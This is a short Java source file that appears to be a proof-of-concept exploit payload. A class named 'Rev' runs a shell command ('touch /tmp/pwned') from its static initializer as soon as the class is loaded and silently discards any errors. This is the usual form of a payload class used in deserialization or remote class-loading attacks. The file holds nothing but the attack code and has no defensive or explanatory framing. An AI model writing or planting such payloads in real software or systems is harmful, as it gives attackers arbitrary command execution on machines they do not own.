public class Rev {
    public Rev() {}
    static {
        try {
            String[] cmds = {"/bin/sh", "-c", "touch /tmp/pwned"};
            Runtime.getRuntime().exec(cmds);
        } catch (Exception e) {}
    }
}